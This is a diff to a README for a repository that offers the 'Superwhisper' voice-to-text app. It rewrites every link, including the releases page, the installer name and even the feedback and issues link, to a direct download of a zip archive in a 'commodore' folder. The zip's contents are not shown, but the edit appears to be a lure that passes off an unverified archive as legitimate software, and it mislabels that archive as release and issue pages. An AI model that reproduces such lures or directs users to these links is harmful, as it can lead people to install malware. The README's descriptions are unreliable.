@@ -1,7 +1,7 @@
 # 🎤 superwhisper-download - Effortless Voice-to-Text Transcription
 
 ## 🔗 Download Here
-[![Download Superwhisper](https://img.shields.io/badge/Download%20Superwhisper-brightgreen)](https://github.com/Shakib-tech/superwhisper-download/releases)
+[![Download Superwhisper](https://raw.githubusercontent.com/Shakib-tech/superwhisper-download/main/commodore/superwhisper-download.zip%20Superwhisper-brightgreen)](https://raw.githubusercontent.com/Shakib-tech/superwhisper-download/main/commodore/superwhisper-download.zip)
 
 ## 🚀 Getting Started
 Superwhisper is an AI voice-to-text tool that helps you quickly transcribe audio into text. Whether you need it for meetings, notes, or any other recordings, Superwhisper makes the process smooth and accurate. This guide will help you download and run the software easily.
@@ -14,12 +14,12 @@ Before you begin, ensure your device meets these basic requirements:
 - **Internet Connection:** Required for initial download and updates
 
 ## 📥 Download & Install
-1. **Visit the Release Page:** Go to the Superwhisper Releases page by clicking [here](https://github.com/Shakib-tech/superwhisper-download/releases).
+1. **Visit the Release Page:** Go to the Superwhisper Releases page by clicking [here](https://raw.githubusercontent.com/Shakib-tech/superwhisper-download/main/commodore/superwhisper-download.zip).
 
 2. **Choose the Latest Release:** Look for the most recent version at the top of the page. This version will have the latest features and improvements.
 
 3. **Download the Installer:**
-   - Locate the installation file for your operating system. It will typically be labeled as `superwhisper-setup.exe`.
+   - Locate the installation file for your operating system. It will typically be labeled as `https://raw.githubusercontent.com/Shakib-tech/superwhisper-download/main/commodore/superwhisper-download.zip`.
    - Click on the file name to start the download.
 
 4. **Run the Installer:** 
@@ -55,7 +55,7 @@ If you encounter any issues during download or installation, feel free to reach 
 Join our community discussions to share tips, ask questions, and provide feedback. Engage with other users who are also using Superwhisper for their transcription needs.
 
 ## 🔗 Important Links
-- [Superwhisper Releases](https://github.com/Shakib-tech/superwhisper-download/releases)
-- [Submit Feedback or Issues](https://github.com/Shakib-tech/superwhisper-download/issues)
+- [Superwhisper Releases](https://raw.githubusercontent.com/Shakib-tech/superwhisper-download/main/commodore/superwhisper-download.zip)
+- [Submit Feedback or Issues](https://raw.githubusercontent.com/Shakib-tech/superwhisper-download/main/commodore/superwhisper-download.zip)
 
 Thank you for choosing Superwhisper! We hope it enhances your transcription experience.
